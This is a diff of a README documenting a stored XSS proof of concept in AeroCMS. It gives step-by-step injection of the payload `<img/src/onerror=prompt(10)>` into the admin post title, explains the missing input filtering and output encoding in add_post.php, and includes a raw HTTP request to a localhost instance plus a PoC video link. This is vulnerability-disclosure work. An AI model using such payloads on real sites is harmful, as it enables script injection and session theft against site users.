@@ -1,4 +1,6 @@
 # AeroCMS-Stored_XSS-Poc
+* Login to admin panel -> `Posts` -> `Add Posts` -> `Post Title` -> inject payload `<img/src/onerror=prompt(10)>` -> The XSS will trigger when clicked  button
+* 
 * `add_post.php`
 ![image](https://user-images.githubusercontent.com/79050415/156879687-273b903a-195c-4313-be7a-b4053ecae897.png)
 When inserting into the database, the input is not filtered out of html characters
@@ -7,6 +9,7 @@ When inserting into the database, the input is not filtered out of html characte
 Even when displaying, the entity cannot be properly encoded
 -------------------------------------------------------------
 ![image](https://user-images.githubusercontent.com/79050415/156879926-c7009ae0-54b5-4b5c-a49f-6c693ce8f2e5.png)
+# POC
  * Request
 ```c POST http://localhost:8080/AeroCMS/admin/posts.php?source=edit_post&p_id=28 HTTP/1.1
 Host: localhost:8080
@@ -57,4 +60,6 @@ Content-Disposition: form-data; name="update_post"
 Edit Post
 -----------------------------85448121341942511952219062291--
 ```
+POC VIDEO
+https://drive.google.com/file/d/1kMGPBLKgefvKZj34QxDlPTxXdcT0kRR_/view?usp=sharing
 
